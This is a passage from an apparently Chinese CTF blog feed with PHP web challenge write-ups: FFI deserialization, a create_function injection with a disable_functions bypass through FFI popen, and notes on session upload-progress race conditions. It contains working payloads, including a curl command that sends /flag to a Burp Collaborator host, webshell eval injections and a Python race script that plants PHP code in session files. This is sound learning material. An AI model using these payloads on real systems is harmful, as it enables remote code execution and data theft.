&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;FFI::cdef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;int system(char *command);&amp;#39;&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;start&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>随后在传入的地方执行&lt;code>unserialize(base64_decode(payload))-&amp;gt;__serialize()['ret']-&amp;gt;system(command);&lt;/code>，直接curl外带flag&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&amp;gt;__serialize()['ret']-&amp;gt;system(&amp;quot;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net&amp;quot;);
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223140032.png" alt="image-20211202223140032">&lt;/p>
&lt;p>————在这个题出现之后蚁剑还专门出了对应的插件&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223257130.png" alt="image-20211202223257130">&lt;/p>
&lt;p>但是多次尝试失败，之后看到了这个&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a>之后再看&lt;a href="https://wiki.php.net/rfc/ffi">官方文档&lt;/a>还有&lt;a href="https://www.laruence.com/2020/03/11/5475.html">这一篇&lt;/a>就明白了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png" alt="image-20211202223422195">&lt;/p>
&lt;p>默认情况下FFI只会被用于CLI模式下&amp;amp;预加载php脚本，除非设置&lt;code>ffi.enable=true&lt;/code>，设置之后在webshell就可以直接用蚁剑插件了&lt;/p>
&lt;h3 id="极客大挑战-2020roamphp5-fighterfightsinvincibly">[极客大挑战 2020]Roamphp5-FighterFightsInvincibly&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png" alt="image-20211204173057497">&lt;/p>
&lt;p>很漂亮的前端，看页面源码有注释的提示&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png" alt="image-20211204173130852">&lt;/p>
&lt;p>这个形式，真的是一眼&lt;code>create_function()&lt;/code>了，看一下phpinfo()，用的还是&lt;code>create_function()&lt;/code>的注入&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}phpinfo();/*
&lt;/code>&lt;/pre>&lt;p>看下disable_function&lt;/p>
&lt;pre tabindex="0">&lt;code>system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&amp;lt;/td&amp;gt;&amp;lt;td class=&amp;quot;v&amp;quot;&amp;gt;system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
&lt;/code>&lt;/pre>&lt;p>直接不用看了，有一吨，肯定得绕过；蚁剑的各种插件都失败，得手动绕，ffi扩展开着&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png" alt="image-20211204174245283">&lt;/p>
&lt;p>看到这里&lt;code>ffi.enable=On&lt;/code>，符合蚁剑插件的应用条件，写个webshell试试&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}eval($_POST[wuhu]);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png" alt="image-20211204175626714">&lt;/p>
&lt;p>what&amp;rsquo;s up，竟然没有回显&lt;/p>
&lt;p>尝试ping，发现还不出网，不能用curl外带flag&lt;/p>
&lt;p>那只能从FFI本身下手了，调用c的popen 用管道读命令执行的结果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#111">FILE&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>popen&lt;/code>会调用&lt;code>fork()&lt;/code>产生子进程，然后从子进程中调用&lt;code>/bin/sh -c&lt;/code>来执行参数的命令，type有r(read)和w(write)，依照这个值&lt;code>popen&lt;/code>会建立管道连接到子进程的标准输出设备或写入到子进程的标准输入设备中&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&amp;quot;,&amp;quot;libc.so.6&amp;quot;);$o = $ffi-&amp;gt;popen(&amp;quot;ls / -lah&amp;quot;,&amp;quot;r&amp;quot;);$d = &amp;quot;&amp;quot;;while(($c = $ffi-&amp;gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&amp;quot;0&amp;quot;,0);}$ffi-&amp;gt;pclose($o);echo hex2bin($d);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png" alt="image-20211204180626497">&lt;/p>
&lt;p>另一种方法是调用php源码中的函数&lt;code>php_exec()&lt;/code>，当它的参数type为3时对应调用的是&lt;code>passthru()&lt;/code>函数，其执行命令可以将结果原始输出&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;quot;int php_exec(int type, char *cmd);&amp;quot;);$ffi-&amp;gt;php_exec(3,&amp;quot;ls /&amp;quot;);/*
&lt;/code>&lt;/pre>&lt;p>但是，这道题在buu复现不了，原因是uuid有32个字符，加上连字符有36位，再加上flag{}有42位，但是/readflag程序只允许读出37个字符，所以最后的5位是读不出来的（辣个唯一解可能是爆破的 我试着爆了一会 加延时得跑好久好久好久 放弃了&lt;/p>
&lt;hr>
&lt;p>最近在刷buuoj，有望这个月内把50解以上的题做完捏&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | &lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | &lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | &lt;a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI详解 - 一种全新的PHP扩展方式&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583">Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!&lt;/a> | &lt;a href="https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd">Make Python Faster with CFFI Python Bindings&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://cffi.readthedocs.io/en/latest/">CFFI documentation&lt;/a> | &lt;a href="https://docs.python.org/3/library/ctypes.html">ctypes documentation&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/ccxikka/p/9637545.html">Python cffi学习 &lt;/a> | &lt;a href="https://github.com/wolever/python-cffi-example">cffi-example: an example project showing how to use Python&amp;rsquo;s CFFI&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a> | &lt;a href="http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/">wp2&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>PHP_Session学习笔记</title><link>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</link><pubDate>Mon, 29 Nov 2021 22:23:42 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</guid><description>&lt;p>提到session，能想到什么捏？文件上传，条件竞争，session包含，反序列化…… 让我们一点点说&lt;/p>
&lt;hr>
&lt;h2 id="session配置简述">session配置&amp;amp;简述&lt;/h2>
&lt;p>以7.4.3为例，php.ini中关于Session有几个默认项&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>session.auto_start = 0&lt;/code>：默认不启动session，*但是可以在php脚本中手动执行&lt;code>session_start()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_handler = files&lt;/code>：session以文件形式存储&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_path=&amp;quot;&amp;quot;&lt;/code>：session文件存储路径 文件名为&lt;code>sess_PHPSESSID&lt;/code>&lt;/p>
&lt;p>linux下默认存储位置；*可以被修改&lt;/p>
&lt;pre tabindex="0">&lt;code>/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php5/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;code>session.serialize_handler = php&lt;/code>：session的默认序列化引擎是php&lt;/p>
&lt;p>其实一共有3种，*php和php_serialize这两种是很多题的元凶&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>序列化引擎&lt;/th>
&lt;th>存储方式&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>php&lt;/td>
&lt;td>键名|序列化后字符串&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_binary&lt;/td>
&lt;td>键名的长度对应的 ASCII 字符（会有不可显示的字符）+键名+经过 serialize() 函数反序列处理的值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_serialize(php&amp;gt;=5.5.4)&lt;/td>
&lt;td>将字符串反序列化处理得到的数组&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.enabled = On&lt;/code>：当有POST上传行为时，此次上传的详细信息（如上传时间、上传进度等）都会被存储到session中&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.cleanup = On&lt;/code>：当POST上传完成后，此次的session文件内容会被立即情况&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;&lt;/code>：存入session文件中的前缀部分&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;&lt;/code>：默认name，*可控可利用&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.use_strict_mode = 0&lt;/code>：表示我们对Cookie中的PHPSESSID字段可控&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="文件包含条件竞争">文件包含&amp;amp;条件竞争&lt;/h2>
&lt;p>默认情况下&lt;code>session.use_strict_mode = 0&lt;/code>，当我们设置了Cookie的&lt;code>PHPSESSID&lt;/code>字段后的值value后，php会自动创建session文件（默认路径&lt;code>/tmp/sess_PHPSESSID&lt;/code>）；注意这个行为并不需要&lt;code>session.auto_start = On&lt;/code>或是&lt;code>session_start()&lt;/code>来手动开启就会被PHP自动初始化一个session，并将prefix+value写入sess_PHPSESSID文件中；整个流程中value可控，我们可以把恶意的payload加载到sess文件中然后包含，得到rce&lt;/p>
&lt;p>这是一个常见的上传表单&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.php&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span> &lt;span style="color:#75af00">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;666666&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当然一般的题不会有这么单纯，还会配一个默认项&lt;code>session.upload_progress.cleanup = On&lt;/code>；但是如果我们构造上传表单时传的无用文件很大时就可以来个顶级拉扯（条件竞争），在它被清空前先包含&amp;amp;rce&lt;/p>
&lt;h3 id="wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again&lt;/h3>
&lt;p>开幕源码暴击&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个题的非预期解：文件包含+条件竞争&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;span style="color:#111">sessid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;AMIZ&amp;#39;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;system(&amp;#39;tac /var/www/html/flag.php&amp;#39;);&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
